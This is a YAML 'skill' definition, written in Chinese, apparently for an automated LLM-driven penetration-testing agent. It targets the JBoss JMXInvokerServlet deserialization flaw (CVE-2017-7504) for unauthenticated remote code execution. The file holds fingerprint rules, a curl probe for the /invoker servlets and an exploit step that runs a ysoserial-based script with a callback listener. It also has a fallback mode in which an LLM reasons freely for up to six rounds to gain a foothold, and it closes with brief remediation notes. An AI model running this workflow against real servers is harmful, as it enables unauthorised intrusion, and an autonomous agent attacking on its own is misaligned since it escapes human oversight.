# ═══════════════════════════════════════════════════════════
# JBoss CVE-2017-7504 — JMXInvokerServlet 反序列化 RCE
# ═══════════════════════════════════════════════════════════
skill_id: jboss_deserial_rce
name: "JBoss JMXInvokerServlet 反序列化 RCE (CVE-2017-7504)"
category: java_deserialization
phase: foothold
version: "1.0"

principle: |
  JBoss AS 4.x 的 /invoker/JMXInvokerServlet 端点接受 Java 序列化对象，
  无需认证。用 ysoserial + JDK 8 生成 payload 直接 POST 即可 RCE。
  响应中无命令输出（盲执行），需回调或写文件确认。

match:
  rules:
    - fingerprint_contains: ["jboss"]
    - fingerprint_contains: ["JBoss"]
    - evidence_contains: ["jboss"]
    - evidence_contains: ["JMXInvokerServlet"]
    - cve_matches: ["CVE-2017-7504"]
    - cve_matches: ["CVE-2017-12149"]

probes:
  - id: confirm_jboss
    description: "确认 JBoss 和反序列化端点可访问"
    steps:
      - command: |
          for path in /invoker/JMXInvokerServlet /invoker/EJBInvokerServlet; do
            code=$(curl -s -o /dev/null -w "%{http_code}" \
              "{ENDPOINT}${path}" --max-time 10 2>/dev/null)
            echo "SERVLET${path}: HTTP ${code}"
            if [ "$code" = "200" ] || [ "$code" = "500" ]; then
              echo "JBOSS_SERVLET_FOUND"
            fi
          done
          resp=$(curl -s {ENDPOINT} --max-time 10 2>/dev/null)
          if echo "$resp" | grep -qi "jboss\|JBoss"; then
            echo "JBOSS_CONFIRMED"
          fi
        parse_rules:
          - if_contains: ["JBOSS_SERVLET_FOUND"]
            set: { servlet_found: true }
          - if_contains: ["JBOSS_CONFIRMED"]
            set: { jboss_confirmed: true }

exploit_paths:
  - path_id: jboss_script
    name: "jboss_exploit.py 回调检测利用"
    priority: 1
    conditions:
      servlet_found: true
    steps:
      - id: run_exploit
        description: "ysoserial + 回调检测爆破"
        publish_ports: [39877]
        command: |
          python3 /opt/jboss_exploit.py {ENDPOINT} \
            --lhost "$LHOST" --port 39877 2>&1
        timeout: 300
        success_criteria:
          stdout_contains_any: ["JBOSS_RCE_CONFIRMED", "JBOSS_BLIND_SENT"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_jboss_deserial"

  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 6
    conditions:
      servlet_found: true

remediation: |
  1. 升级 JBoss/WildFly 到最新版本
  2. 删除或限制 /invoker/ 路径的访问
  3. 移除 classpath 中不必要的 commons-collections
